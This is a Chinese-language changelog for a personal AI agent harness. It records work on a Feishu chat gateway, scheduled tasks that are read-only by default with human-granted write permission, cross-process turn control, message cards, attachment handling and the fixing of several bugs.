- 会话、记忆、快照、transcript、工具结果、tasks、crons、邮箱、飞书绑定、API 日志统一
  放到 `<home>/.cache`。

`cron_scheduler.DURABLE_PATH`、`task_system.TASK_DIR`、`cli_input` 的 cache-debug、
`feishu_gateway.BINDINGS_PATH`、`workspaces.default_path()`、`harness_api` 的 os_tasks 与
访问日志，原本各写各的 `Path(__file__).parents[1]` 或相对 `.cache`，现在都走
`paths.cache_path()`，`HARNESS_HOME` 一处生效。工作区级的 `sandbox-tmp` 保持不动。
`agent_teams.MAILBOX_DIR` 也归 home，并顺带修了 `mkdir()` 缺 `parents=True`——全新 home
首次导入会因 `.cache` 不存在直接 FileNotFoundError。

**避免静默“丢数据”**：`--doctor` 输出 `[home]` 与 `[sessions]` 实际路径；会话选择器为空时
提示里带上 `SESSIONS_DIR` 和 `HOME_DIR`；启动时如果当前目录还留着旧 `.cache/sessions` 而
home 里没有会话，stderr 打一条 `HARNESS_HOME=<当前目录>` 的迁移提示。没有自动合并两套
目录——那会把不同 home 的历史混成一个，且并发写无法仲裁。

**测试**：新增 `tests/test_paths.py`，包含真实子进程用例——在 `work-a` 创建会话、在
`work-b` 列出，断言两者都用同一个 home 且 `work-a/.cache/sessions` 不存在；`--doctor`
的路径输出与选择器空态提示也在同一路径约定下。`conftest` 补隔离 `MEMORY_DIR`。
全量 **1510 passed / 1 skipped**；Ruff、`py_compile`、`git diff --check` 通过。

使用方式：默认无需配置；要在多个 home 间切换或迁移旧目录，设置 `HARNESS_HOME=<目录>`。

## Personal Agent 阶段 1 第二块：飞书 watcher（终态通知 + 至少一次投递）

手机端此前只能看到“自己发起的回合”的流式回写；TUI / cron / 其他客户端跑完的回合，
手机上没有任何提示。补法分两层：`src/turn_watcher.py` 负责游标/去重/重试，网关负责
“拉 SSE + 发飞书”。

**增量而不重放**：每个绑定会话保存 `cursor`（已处理的最大 `seq`），网关用
`GET /v1/sessions/{id}/stream?after=…&once=1` 拉快照。只消费阶段 1 引入的
`turn_terminal`；`source='feishu'` 的回合跳过，因为手机上已经看过流式输出。

**至少一次而不是“恰好一次”**：顺序是「发送 → 写游标 + 已通知键」。发送失败就不推进
游标，下一轮重试；进程在发送成功、落盘之前崩溃会重复发一次。`attempts` 记录
`(session, turn, status)` 的发送次数，便于事后确认重复窗口。SSE 重放和进程重启由
`notified` 集合去重；集合与游标一起原子写入 `turn_watch.json`（与 bindings 分开，
不破坏后者严格的 `chat_id -> session_id` 结构）。

**无进展只提示、不判失败**：`turn_started` 超过 `FEISHU_WATCH_STALLED`（默认 300s）
且没有终态时发一条“仍在运行，可能在等待审批或卡住”；同一 turn 只发一次，不写终态。

**生命周期**：watcher 线程随网关启动/停止（`start_watcher/stop_watcher`），轮询间隔
`FEISHU_WATCH_POLL` 默认 1s。`stop()` 会先停 watcher 再断分发线程。

测试：核心 watcher 覆盖重放去重、feishu 来源跳过、发送失败重试且游标不动、重启后状态
恢复、通知记录有界（200 条）、停滞提示只发一次；网关测试用真实 ASGI SSE 验证
“TUI 回合完成 → 飞书收到卡片”和失败卡片带 `error_type`。全量 **1518 passed / 1 skipped**，
Ruff、`py_compile`、`git diff --check` 通过。

阶段 1 仍欠：steer 幂等键、跨进程 steer/interrupt、多网关实例的会话分配。

## steer 幂等键与一个自锁 bug

按计划补 steer 的幂等语义时，把结果缓存写在了 `_steer_lock` 临界区里：`steer()` 持锁
调用 `_remember_steer()`，后者再次 `with self._steer_lock` —— `threading.Lock` 不可重入，
第一个“同 request_id 连发两次”的用例直接死锁，pytest 卡住不返回。改成 `RLock` 后恢复；
测试也加了 `join(timeout)` 断言，以后同类回归会失败而不是挂住。

功能本身：
- `POST /v1/sessions/{id}/steer` 接受可选 `request_id`；同 `(session, request_id)` 只入队/
  发送一次，第二次返回 `duplicate: true`。结果缓存 256 条（有界）。
- 回合收尾窗口（token 还在、注入队列已被移除）不再报 409 丢消息，而是原子降级为下一条
  普通消息，返回 `status=sent, reason=turn_ending`，同样受幂等键保护。

全量 **1520 passed / 1 skipped**。

## 跨进程 steer / interrupt：用目录做最小控制面

阶段 1 补完最后一项能力：TUI 在 A 进程、API/daemon 在 B 进程时，手机端也能对 A 的回合
steer / interrupt。没有引入新守护进程，也不做 socket 协议，而是让回合持有者暴露一个
小目录（`src/turn_files.py`）：

    <cache>/control/<session_id>/
        owner.json     {turn_id, session_id, source, pid, started_at}
        steer/*.json   {content, request_id}
        cancel         {turn_id, ts}

**回合侧**：`agent_loop` 启动时写 owner，把原有 `steer_provider` 与文件 inbox 合成一个
provider（下一轮请求前注入）；新增 `_turn_cancelled(state)` 同时看进程内 token 与 cancel
文件，流式回调与轮循环都改用它。cancel 每 0.5s 才 stat 一次，避免每个 token 都读盘。
结束/失败/取消都在 finally 里删 owner 与 cancel。

**发送侧**：`AgentRuntime.steer/interrupt` 先查本进程 token（快路径），没有则看 owner：
有 owner 就写文件并返回 `queued/cancelling`（带对方 turn_id/source），没有 owner 保持原
语义（steer 降级为普通消息、interrupt 返回 idle）。所以“跨进程”是新增的一条通道，
不改变同进程行为，也不改变“没有回合时 steer 就是发消息”的约定。

**边界**：只做单机文件协调（和全局单回合协调器一致）；队列有界（50 条、单条 32k 字符），
超限显式报错而不是丢；owner 超过 1h 视为崩溃残留；cancel 标记带 turn_id，旧标记不会取消
新回合，因此启动时不必先删标记——顺带消掉了“先删标记再写 owner”之间丢取消的窗口。

**代码质量上的两个修正**：
1. steer 幂等最初在持有 `threading.Lock` 时重入 → pytest 死锁；改 `RLock`，并让测试用
   `join(timeout)` 断言，回归会失败而不是挂住。
2. `TurnChannel.close()` 与 `agent_loop` 启动失败路径都要求释放 token；补了
   `except BaseException: turn_control.end_turn(token)`，避免异常时留下“永远有回合”的状态。

测试：owner 生命周期、steer 只取一次、request_id 去重、cancel 的 turn_id 匹配、旧标记
忽略、崩溃残留过期、队列上限、runtime 跨进程路径、agent_loop 注入文件 steer、
`/cache profile` 识别新目录。全量 **1531 passed / 1 skipped**，Ruff、`py_compile`、
`git diff --check` 通过。

## Personal Agent 阶段 2：cron 管理接口与 occurrence 去重

阶段 2 的第一块是“让定时任务可管理、触发不重复”，先不引入新的执行路径。

**管理接口**（`src/api_crons.py`）：`GET /v1/crons`、`POST /v1/crons`、
`DELETE /v1/crons/{id}`，直接调用 `cron_scheduler`，不复制调度状态。校验仍然只有
`validate_cron` 一处：表达式错误 400；`job_id` 已存在 409（`schedule_job` 新增可选
`job_id` 参数，为稳定 ID/heartbeat 铺路）；删除未知 ID 404。飞书端 `/cron` 做薄封装，
`/cron add` 同时接受 `"0 9 * * *" 提示词` 与五段裸写——cron 表达式自身含空格，
用普通 `partition(' ')` 会把表达式切碎。`GatewayClient` 新增三个 cron 方法，并把 4xx
的 `detail` 透出来，而不是让用户看到 httpx 的通用 400 文案。

**occurrence 去重**：原来 `_last_fired` 只存在内存里，进程在同一分钟内重启会把同一个
“每日 9 点”任务再触发一次。现在 `CronJob.last_fired` 随 durable job 一起落盘；扫描逻辑
抽成 `tick(now)`，循环只负责按秒调用，测试可以直接用固定时间验证“同一分钟只触发一次、
下一分钟继续触发、one-shot 触发后从内存与持久文件里都消失”。`tick` 里所有 durable 变更
一次性 `save_durable_jobs()`，不做逐任务写盘。

**测试**：新增 `tests/test_cron_management.py`（触发/重启/一次性/稳定 ID/表达式校验）；
API cron CRUD 走真实 FastAPI；飞书 `/cron` list/add/delete 与错误路径走 ASGI transport。
`conftest` 增加 cron 全局状态隔离（任务表、队列、`_last_fired`、`crons.json` 路径），
避免用例之间的定时任务互相污染。全量 **1539 passed / 1 skipped**，Ruff、`py_compile`、
`git diff --check` 通过。

阶段 2 仍欠：每日心跳（只读摘要）、时区/misfire 策略、副作用任务的授权与审批。

## 飞书接入：3 步 + 按钮优先，不用记命令

原来的接入信息散落在 README，第一次用要自己拼：创建应用 → 配事件/权限 → 填一堆环境变量
（含自己的 open_id）→ 两个进程分别起。日常操作也几乎全是 `/sessions`、`/new`、`/stop`
这类斜杠命令，手机上很难用。

参考本机 dsh-im 插件的配置（`integrations/dsh-feishu/config.json`）可以看出它的取舍：
`ownerOpenIds` 单人所有、`groupResponseMode: mention`、`stepPushMode: streaming_card`
（进度只更新一张卡）、`slashPanel`（把命令做成面板而不是让用户背），以及
`seenMessageIds` 去重。这里只借鉴“卡片面板 + 流式单卡 + 自助拿 open_id”，没有搬
topics/mirrors/watches 那套更重的模型。

**接入缩写为 3 步**（`docs/FEISHU_SETUP.md` + `feishu.env.example`）：
1. 开放平台建应用：机器人 + 长连接事件 + `im.message.receive_v1` + 卡片回调 + `im:message`；
2. `.env` 填 `FEISHU_APP_ID / FEISHU_APP_SECRET / HARNESS_API_TOKEN / FEISHU_ALLOWED_USERS`
   —— 不知道 open_id 就先留空启动，给机器人发消息，它回你 `FEISHU_ALLOWED_USERS=ou_...`；
3. 起 API（`uvicorn api:create_app --factory --port 8000`）和网关（`python src/feishu_gateway.py`）。
另加 `python src/feishu_gateway.py --check`：离线检查缺哪些变量并打印步骤，不连飞书。

**日常不用命令**（`src/feishu_panel.py`）：首次私聊自动建会话后发一张「Harness 控制台」卡片，
按钮是 新会话 / 会话列表 / 停止当前回合 / 当前状态 / 使用说明。按钮走卡片回调 → 分发线程，
复用现有 `_handle_new`、`_show_sessions`、`api.interrupt`、`get_workspace`，没有为面板另造
执行路径。没有卡片能力的传输层回退为一行文字提示。`/help` 保留完整命令清单——自动化、
排障仍然需要，只是不再是日常入口。

**未接受未授权的消息**也改了：以前静默忽略，用户完全不知道为什么没反应；现在回一句
带自己 `open_id` 的配置提示（不建会话、不接近模型），这是接入时最容易卡住的一步。

没做、也不打算现在做：飞书「应用配置导入」manifest——它的 JSON 格式随平台版本变化，
写死一份容易在用户那里直接导入失败；`--check` 只做本地校验，不假装能验证开放平台侧配置。

测试：首次私聊必须发控制台卡片且卡片文案不含 `/new`；未授权回复带 open_id；
面板按钮 new/status/stop 经分发线程生效；无卡片能力时回退文字；`check_setup` 与
`--check` 退出码；`/help` 仍是完整命令清单。全量 **1545 passed / 1 skipped**，
Ruff、`py_compile`、`git diff --check` 通过。

## 404 轮询风暴与“Working 6–7 秒才出字”

**404**：网关绑定里有一个会话（`26de36de…`）在 agent home 的 `.cache/sessions` 里不存在——
典型的旧目录/换 home 前创建的绑定，或会话被归档删除。watcher 每秒拉一次
`/v1/sessions/{id}/stream`，于是 API 访问日志里堆满 404，用户侧只看到“没反应”。

修法（不做静默吞错）：
- `_watch_fetch` 把 404 转成 `FileNotFoundError`；watcher 对“会话不存在”只报告一次，
  之后跳过该会话，不再每秒打 API。
- 网关的 `on_missing` 解除该会话的所有聊天绑定，并在对应聊天里说明一次；下一条消息会
  新建会话，不会继续对着不存在的 id 发。
- 如果用户直接发消息时绑定已失效（404），`_send_agent_reply` 会**新建会话并重试一次**，
  聊天里看到的是“原会话已不存在，已新建会话继续”，而不是 `[error] 404`。
- 仅把 404/FileNotFoundError 当作“会话不存在”；其它错误仍然走失败提示，不掩盖故障。

**“Working 6–7 秒才出字”**：实测当前模型（deepseek-flash）的流里先来 47 个
`reasoning_content` 块、4.37s 后才出现第一个正文块（总 4.89s）。`_stream_completion`
此前只转发正文，思考阶段 UI 只有 Working，看着就像卡住。现在：
- 推理块到达时每 0.5s 发一次 `activity(state='thinking', detail='模型思考中（N 字）')`，
  TUI 的边框状态显示 `Working 6.2s · 模型思考中（120 字）`；只报字数，不把推理正文写进
  事件/日志/会话。
- 取消检查移到了推理分支：以前思考阶段按 Esc 要等正文开始才生效，现在立即中断。
- 正文仍走原来的 delta 渲染，行为不变。

测试：watcher 缺失只报一次并停止轮询、网关解绑与发送重试、`_is_missing_session` 判定、
推理阶段 activity 不带正文、思考阶段可取消、边框状态显示思考进度。全量
**1552 passed / 1 skipped**，Ruff、`py_compile`、`git diff --check` 通过。

## 404 轮询的真凶：Windows 系统代理劫持了 loopback

上一轮加的 404 自愈没有生效，日志里仍是每秒一条 404。用真实 API 复现后发现：
`_watch_fetch` 看到的不是 404，而是 **502**。原因是本机开着系统代理
（`127.0.0.1:10090`），httpx 的 `trust_env` 在 Windows 上会读注册表代理设置，
于是**连 `127.0.0.1:8000` 也被转发**；代理对 SSE 流返回 502（uvicorn 那边能看到被
转发过的 404），watcher 自然认不出“会话不存在”，就一直重试。

**修法**：`GatewayClient` 对 loopback 地址一律 `trust_env=False`（localhost / 127.0.0.0/8 /
::1），远端 API 仍尊重环境/系统代理。这样本机流量直连，SSE 不再经过代理，404 能如实
到达 watcher；顺带也修掉了飞书侧流式卡片被代理缓冲的问题（之前很可能退化成一次性回复）。

配合上一轮的自愈逻辑，现在的行为是：首次轮询发现会话不存在 → 解绑该会话的所有聊天 →
提示一次“原会话已不存在…”→ 写回 bindings → 后续不再轮询该会话。用临时 uvicorn +
真实 bindings 副本验证：第一次 poll 解绑并清空文件，第二次 poll 零请求。

**需要重启网关进程**：API 重启不会加载网关代码；旧网关进程会继续按旧逻辑每秒轮询。
重启后第一次轮询会一次性清掉失效绑定（每个相关聊天只收到一条说明）。

测试：新增 loopback 判定与 `trust_env` 取值断言；全量 **1552 passed / 1 skipped**。

## 飞书回复改成 schema 2.0「任务过程」卡片

用户拿 dsh-im 的截图问能不能做成那种效果。dsh-im 的源码就在本机
`node_modules/@xmanrui/dsh-im/src/channels/feishu/feishu-cards.mjs`，里面明确用了
卡片 **schema 2.0**：`body.elements`、`markdown`、`collapsible_panel`
（`background_color: grey-50`、右侧 chevron 图标），以及“完成后把工具/思考面板塞进一个
折叠的「过程详情」”。照这个结构实现了 `src/feishu_step_card.py`：

- 运行时：答案 + 展开的工具摘要面板 + `_运行中 · 正在执行 bash · 00:03_`；
- 完成后：工具摘要收进折叠的「📋 过程详情」，底部改成 `_已完成 · 总用时 00:12_`；
- 工具摘要来自 `TurnProgress` 新增的计数（`tool_started` 名称计数、`tool_profile`
  的耗时与 `status=error`），所以失败项会以 `⚠️ glob — SEARCH_FAILED` 出现在详情里；
- SSE 的 progress 帧把 `tool_counts` / 错误数纳入去重 marker，避免“工具失败了但最后
  一张卡没更新”。

**引用回复**：截图顶部的引用是飞书“回复消息”的 UI，不是卡片元素。`LarkTransport` 现在
支持 `reply_to`（`im.message.reply`），网关把入站 `message_id` 一路带进分发队列和
`_send_agent_reply`，于是回复卡会挂在用户消息下面；没有 message_id（测试/模拟器）
时行为不变。

**兼容与回退**：旧 Markdown 卡片路径保留，`FEISHU_STEP_CARD=0` 可切回；传输层没有
`send_step_card` 时自动走旧路径；2.0 卡片发送失败会退到纯文本回复（`stream_failed`），
不会静默丢答案。

测试：工具摘要行、折叠层级、运行中/完成态、`reply_to` 传递、环境变量回退、
禁用后仍用 Markdown 卡、卡片 JSON 可序列化；全量 **1558 passed / 1 skipped**。

## 飞书观感收尾：启动即给控制台、完成通知去掉内部字段

两条反馈都指向“别让内部细节出现在聊天里”。

**常驻入口**：控制台卡片原来只在首次私聊时出现一次，之后想用就得自己记命令。现在：
- 网关启动时给所有已绑定聊天发一次「Harness 控制台」（`announce_startup`），服务一上线
  入口就在；
- 每次完成的过程卡底部多一颗「⚙️ 控制台」按钮（`panel=menu`），点开即重新发送控制台；
  卡片仍只有一张，不会在聊天里堆消息。

**通知文案**：watcher 的完成/取消/失败通知原来带 `会话 26de36de · turn t-1 · 来源 tui`，
这些是排障字段，对手机阅读是噪音。现在只保留结论：`✅ 回合完成` / `⏹ 回合已取消` /
`⚠️ 回合失败（APIStatusError）`；停滞提示保留“约 N 分钟，可能卡住”，不带 ID。
排障信息仍在会话事件（`turn_terminal` 的 turn_id/source）里，需要时能查，不用展示。

测试：启动面板发到每个绑定聊天、`panel=menu` 重新打开控制台、完成卡带控制台按钮、
通知文案不再含 turn/来源。全量 **1560 passed / 1 skipped**。

## 飞书：按批次显示工具摘要 + 图片/文件输入

**工具摘要按批次**：截图里是多个「工具摘要（2）」「工具摘要（18）」，对应 agent 的多个
工具批次。`TurnProgress` 现在记录 `tool_batches`（每批的工具名、状态、错误类型），
`feishu_step_card` 每批渲染一个折叠面板；只有一个批次时标题仍是「工具摘要（N）」，
多个批次加序号，全部收进「📋 过程详情」。聚合计数保留为兜底（旧事件没有批次时仍可用）。

**多模态输入**：此前网关只处理 `text`，图片/文件会被直接丢弃。现在：
- `LarkTransport.download_image/file` 走 `im.v1.image/file.get` 下载字节；
- `_handle_attachment` 把附件落到**会话工作区**的 `.cache/feishu-inbox/`（uuid 前缀避免重名，
  扩展名按 magic/原文件名判断），再合成一条提示消息进入正常回合：
  图片提示用 `view_image`，文件提示用 `read_document`/`read`。这样不需要给 API/stream
  增加附件传输面，也复用现有权限与工具；
- 大小上限 `FEISHU_MAX_ATTACHMENT_MB`（默认 20MB）；超限、下载失败、无传输能力都会
  明确回复，不静默丢；
- 语音/表情等其余类型回一句“暂不支持”，而不是当没看见；
- 分发队列支持 dict 载荷（panel/attachment/unsupported），文本路径行为不变。

测试：图片落盘 + `view_image` 提示、PDF 落盘 + `read_document` 提示、超限拒绝、不支持
类型提示、多批次工具摘要渲染。全量 **1564 passed / 1 skipped**。

## 附件下载 234001：用错了消息资源接口

现象：发图片后回复 `[附件] 下载失败：feishu image download failed: 234001
Invalid request param`。

原因：消息事件里的 `image_key` / `file_key` 是**消息资源**，必须用
`GET /im/v1/messages/{message_id}/resources/{file_key}?type=image|file` 下载；
我最初调的是 `im/v1/images/{image_key}`（那是应用自己上传图片后拿回的 key 的接口），
服务端把它当非法参数，返回 234001。dsh-im 的 `resource-download.mjs` 也走
`messages/{id}/resources/{key}`。

修法：`LarkTransport.download_message_resource(message_id, key, kind)` 使用
`GetMessageResourceRequest`（message_id / file_key / type），`_handle_attachment`
把入站 `message_id` 传给下载；传输层没有该方法或缺少 message_id 时明确提示，
不再拿 image_key 去试另一个接口。README 的飞书说明保持“图片/.cache/feishu-inbox”不变。

测试：真实 SDK 请求对象断言（message_id/file_key/type 均正确），加图片/PDF 下载替身回归。
全量 **1565 passed / 1 skipped**。

## post（富文本）消息支持

飞书里带标题/分段/链接/内嵌图片的消息是 `message_type: post`，之前直接落到
“暂不支持 post 消息”。现在 `parse_post_content` 兼容 `{title, content}` 与按语言包装的
`{zh_cn: {...}}`，把段落拼成文本、链接转成 `文字 (href)`、收集 `image_key`；纯文字 post
按普通消息处理，带图 post 则把图片经 `messages/{id}/resources` 下载到工作区
（最多 6 张），合成一条“[用户发来富文本消息] + 原文 + 图片路径”的提示交给 agent，
由 `view_image` 查看。语音/表情仍然只回提示。

## 飞书其它消息类型与文件扩展名

“文件类型”与“消息类型”要分开：`file` 消息本身不需要扩展名白名单，PDF/DOCX/XLSX/PPTX/
CSV/TXT/ZIP 等都按字节下载；能否解析由后续工具决定（`read_document` 支持 PDF、新版
Office，扫描 PDF/旧 OLE 文档仍有各自限制）。

补充接收 `audio` 与 `media`（视频）消息：二者也通过消息资源接口下载到
`.cache/feishu-inbox/`，再把路径交给正常会话；回复明确“已保存、当前不自动转写/视频理解”，
不假装模型已经看懂。音频转写可以接 ASR（dsh-im 的做法是下载 opus → ffmpeg 16k mono →
ASR API），但这会引入 ffmpeg、ASR provider/key、音频时长/费用和隐私配置，所以暂不默认启用。
视频理解同理，后续可先做缩略图/关键帧，再决定是否接视觉模型。

仍然不自动解析 sticker、interactive、share_chat、share_user、location 等非文件消息；
这些类型会明确提示。测试覆盖 audio/media 落盘、文件扩展名无 gateway 限制和能力提示。
全量 **1569 passed / 1 skipped**。

## 定时任务默认只读、后台审批与关闭收尾

cron 任务原先继承创建时的会话档位，谁建的任务就以谁的权限在后台跑，没人授权过副作用。
现在 `CronJob.allow_side_effects` 默认 `False`：只有 `POST /v1/crons` 显式传字段或飞书
`/cron add --writes ...` 才打开；模型侧 `schedule_cron` 不接受该参数，不能给自己授权。

只读回合在 `hooks.use_scheduled_turn(read_only=True)` 中重判：先按当前策略保留硬拒
（秘密路径/黑名单），再用 `Policy('read-only', 'never')` 复核，写文件、联网、第三方工具和
任务/会话控制类工具直接拒绝，**不进入审批**；拒绝语指向“重建任务并显式允许副作用”。
可写任务的审批走 `decide_queued`，后台线程不会去读 stdin；混合批次取最严档。
交互回合进行中触发的心跳也不再以 `[Scheduled]` 注入模型，只在本地生成并投递，
只读任务留到专门的 cron 回合，不借用用户的写权限。

关闭时 housekeeping（标题 + 记忆提炼）不再裸退：`shutdown_housekeeping(timeout)` 有界等待，
未完成线程按 `housekeeping:<session>:<turn>` 打印告警；API lifespan 与 CLI 退出都调用它。

测试：`tests/test_cron_side_effects.py`（默认只读持久化、只读拒绝矩阵、可写任务走队列、
混批严格档、长回合过滤）、`tests/test_housekeeping_shutdown.py`、API 与飞书入口用例。
全量 **1601 passed / 1 skipped**（`test_turn_slot_released_after_turn` 偶发红，单跑通过）。

## 定时任务结果投递与失败隔离

cron 回合跑在新建的、未绑定会话的 `SessionEventStore` 里，结果只写进那份临时日志，
飞书 watcher 从来读不到——用户设了“每天提醒我”，到点只在服务器上自言自语。
现在新增 `cron_delivery` 发件箱：回合结束后按任务分组的 `deliver_to` 写入
`.cache/cron_results/outbox.json`（按 `chat_id|job_id|occurrence` 生成稳定 item id，
上限 20 条，正文截断 12k 字符），网关每 15 秒轮询 `GET /v1/cron-results`，
发送成功才 `POST .../ack`，失败或该聊天未绑定就留在箱里下次再试——至少一次，不丢。

投递目标不是广播：`CronJob.deliver_to` 为空的任务继续只进会话日志；模型通过
`schedule_cron` 建的任务自动继承当前聊天（`hooks._ORIGIN_CHAT` ContextVar 从
`AgentRuntime.send(origin_chat=...)` 一路带到工具层），用户从飞书说“提醒我”才会真的
推回飞书，避免凭空往陌生 chat 发消息。带投递目标的任务也不再被无关的交互回合
“顺手消费”掉，只在自己那次 cron 回合结束后投递一次。

顺带修了一个会静默瘫痪调度器的问题：cron 回合抛出的异常原先会穿出
`run_agent_turn_locked` 和 `queue_processor_loop`，`cron-worker` 线程直接死掉，
之后所有定时任务都不再触发。现在两层都兜住并打印 `[cron] turn failed`，
失败也会以 `⚠️ 定时任务失败` 的形式投递（有目标时），线程继续跑。

测试：`tests/test_cron_delivery.py`（去重/确认/上限/截断、成功与失败投递、无目标静默、
带目标任务不被交互回合消费、worker 存活、origin chat 继承与重置、runtime 透传）、
飞书只向已绑定聊天推送、API 往返。定向 **164 passed**；全量 **1615 passed / 1 skipped**。

## 飞书自然语言入口：命令之外还缺什么

按 `/help` 逐条对照卡片按钮与模型工具后，结论不是“所有命令都要搬家”，而是
三类情况：会话新建/切换/fork、停止/状态、审批、模型信息已有卡片或工具入口；
`/find`、`/rename`、`/revoke` 只能打字；`/cron` 已有工具，但模型不知道聊天场景
不该让用户敲命令，也不知道今天的日期。

- `rules_main` 增加第 4 条：聊天客户端里用 `schedule_cron` / `find_sessions` /
  `rename_session` / `revoke_permissions` 等工具完成请求，不要让用户输入斜杠命令。
- `schedule_cron` / `list_crons` / `cancel_cron` 描述改成提醒语义，并写明结果自动
  推回当前聊天、任务默认只读。
- 每轮请求尾部追加一条本地时间 system 消息（`prompt_assembly.environment_message`）。
  不放进 system 前缀：时间每分钟变化会让供应商前缀缓存整段失效；尾部消息排在记忆
  块之前（`inject_memories(..., environment=)`），两者都在稳定前缀之后，记忆块仍是
  请求最后一条。模型据此把“明天/下周一”换算成 cron。
- 环境消息会出现在工具结果之后，原先靠 `messages[-1]['role'] == 'tool'` 判断“第二轮”
  的两个并发用例改成扫描请求里是否已有 tool 结果（假模型的入参假设，不是产品契约）。
- 新增 `src/tool_sessions.py`：`find_sessions` 直接扫会话目录；`rename_session`
  写当前回合已打开的 SessionEventStore（source='user'，自动标题不覆盖）；
  `revoke_permissions` 复用 `hooks.GATE.revoke_session`。改名/撤销不对子代理暴露，
  只读定时回合也禁止，避免后台任务改会话元数据或撤掉交互审批。
- 飞书 `/help` 首行改成“日常不用记命令”，命令清单保留给排障。

有意保留为命令/API 专属：`/workspace add|remove`（安装期配置）、`/archive` /
`/delete`（破坏性，需二次确认）、`/cd`（会话中途换工作区，现有卡片可用“新会话 +
选目录”代替）、`/sandbox`（安全档位）、`/quit`（解绑）。cron 的可写授权仍需
`/cron add --writes` 或 API；卡片审批留作后续，模型不能给自己授权。

测试：`tests/test_tool_sessions.py`（空查询、limit 夹取、改名截断/来源、撤销计数
与异常）、`tests/test_prompt_assembly.py` 的环境消息与规则、飞书帮助文案、工具
schema 顺序与指纹；`test_cron_side_effects.py` / `test_subagent_surface.py` 补上
“只读定时回合拒绝改名/撤销、子代理不暴露这两个工具”的归属断言。定向回归
**142 passed**；全量 **1626 passed / 1 skipped**，Ruff 全通过。

## 定时任务授权卡片

计划里最后一块安全边界：可写定时任务此前只能靠 `/cron add --writes` 或 API 开启。
现在 `PATCH /v1/crons/{job_id}` + `cron_scheduler.update_job` 提供「改授权/改投递
目标」的单一入口（改完按 durable 落盘），飞书 `/cron` 列表改成卡片，每个任务带
「允许写操作 / 收回写权限 / 删除」，控制台加「定时任务」按钮。

安全取舍：
- 模型侧的 `schedule_cron` 仍然不暴露 `allow_side_effects`——授权只能由人在卡片上
  点、或用命令/API 显式给出，模型不能给自己提权。
- 按钮 value 带一次性 `cron_view` token（10 分钟 TTL，按 chat 存）：别的聊天拿到
  value、旧卡片、以及重新渲染后的旧 token 都会被拒绝，避免过期卡片改到新状态。
- 删除走两次点击（确认卡 → 确认删除 / 取消），删除不可恢复，不把误触变成数据丢失。

测试：`update_job` 落盘与未知任务、API PATCH 200/404 与重启后授权仍在、飞书卡片
的授权/收回/二次删除/取消/过期 token/跨聊天重放。全量 **1632 tests collected、
全部通过**（1 个 symlink 跳过）。

## 飞书网关单实例锁

`feishu_gateway.main()` 启动前先拿 `<cache>/locks/feishu-gateway.lock`（复用
`file_lock.exclusive_file_lock`，非阻塞）。拿不到就退出（返回码 2）并提示：
两个网关会对同一条消息回复两次、把同一批 cron/心跳推送发两遍。这是个人单机部署
的实用兜底，而不是多实例会话分配——后者需要网关间协商 chat 归属和推送去重，
在没有真实需求前不做。`FEISHU_ALLOW_MULTI=1` 显式跳过检查（不同应用凭证并行）。

测试：`test_gateway_refuses_a_second_instance` 用同一把 OS 锁模拟第二个进程，
断言不会创建 transport、返回码 2，并覆盖 `FEISHU_ALLOW_MULTI=1` 的放行路径。

## 飞书验收预检发现的两个真问题

**1. durable cron 任务在 Windows 上重启后整表丢失。**
`load_durable_jobs()` 用 `DURABLE_PATH.read_text()`（无 encoding），Windows 上按 GBK
解码 UTF-8 JSON，中文提示词直接抛 `UnicodeDecodeError`；异常被外层 `except` 吞掉，
结果是“静默地一个任务都没加载”。心跳任务因为 `ensure_registered()` 会重新注册而
掩盖了问题，用户自己创建的提醒会消失。修复：固定 `utf-8-sig` 读取，失败再回退一次
locale（兼容旧文件），仍失败则明确报错；单条坏记录只跳过自己，不清空整表。

**2. 旧进程不会加载新代码。**
8000 端口上的 API 是改动前启动的，`/v1/heartbeat` 直接 404；旧网关也没有单实例锁，
日志里看不到任何异常。验收前重启 API 与网关后全部 200。这类“代码对但进程旧”的问题
只能靠重启解决，所以 `scripts/feishu_acceptance.py` 的预检里带上 API 版本探测
（heartbeat 路由）和网关锁状态。

预检同时把 8 类卡片真机发了一遍（`--send-cards bound`），8/8 返回 message_id，
说明 schema 1.0 控制台/列表/工作区卡与 schema 2.0 过程卡都被飞书接受。

## 飞书体验打磨（用完之后的第二轮）

功能验收通过后只改“看得见的地方”，每条都能被真实使用感知到：

1. **运行中卡片带「⏹ 停止这个回合」**：以前长回合想停下要回控制台找按钮，现在
   卡片底部直接有（`stop_row()`，schema 2.0 按钮的 `behaviors[].value`）。完成时
   同一位置换成「⚙️ 控制台」，不再依赖网关手动 append。
2. **失败文案先说人话**：`friendly_error()` 把 402 余额不足、401 鉴权失败、
   403、429、超时、`turn_busy/409` 映射成一句可执行的建议，原始异常降为第二行
   “技术细节”。识别不到就保持原文，不猜。
3. **长答案截断有提示**：`truncated_note()` 在超过 18000 字时补一句“可以让它写入
   文件再发给你”，而不是静默截断。
4. **首次绑定给例句**：自动建会话时控制台卡提示三句可照抄的话（看看项目改了什么 /
   每天 9 点提醒 / 上次聊到哪），降低“第一句该说什么”的门槛。
5. **状态卡信息更全**：模型、工作区、待审批条数、定时任务数量；待审批只报条数，
   不贴命令正文。
6. **新建定时任务后指路**：回复里补“改授权或删除，点「定时任务」卡片即可”。

验收脚本同时补了 `--only`（只发指定卡片）和 schema 2.0 按钮的 `behaviors[].value`
校验——之前校验器只认 `value`，会误报真实卡片。

## 定时任务卡片分页 + 控制台角标

任务多了以后 `/cron` 卡片会很长，手机上要滚半天；控制台也看不出“有没有事要做”。

- `cron_card(..., page=)`：按 `last_fired` 倒序（最近触发的在前、从未触发的最后），
  每页 `PAGE_SIZE=3`，底部「← 上一页 / 下一页 →」。分页按钮带同一个 `cron_view`
  与目标页码，网关 `_handle_cron_action` 先处理 `page` 再查 job。
- **就地翻页**：卡片回调自带 `message_id`，`_show_crons(..., message_id=)` 优先用
  `update_step_card` PATCH 同一张卡。以前每翻一页就新发一张，聊天记录会被“下一页”
  塞满；现在不新增消息（测试断言 `len(fake.cards)` 不变）。
- **旧卡片不再“连坐”**：点过期卡片只提示“这张已过期”，不再把聊天里的最新视图
  一起清掉（否则新卡片的按钮也跟着失效）。
- **控制台角标**：`control_card(pending=, crons=)` 在信息区显示
  「待审批 N 条 · 定时任务 N 个」；待审批>0 时追加“（回 y / n 或点卡片按钮）”。
  只报数量，不贴命令正文。`api.list_crons()` 失败时按 0 显示，面板不能因为
  cron 接口抖动就打不开。

测试：排序（最近触发在前、未触发在后）、分页（页码、页脚、边界按钮、越界收敛）、
`page` 按钮翻页与旧 token 失效、PATCH 就地翻页不新增消息、角标计数与接口失败降级。
全量 1660 passed / 1 skipped。

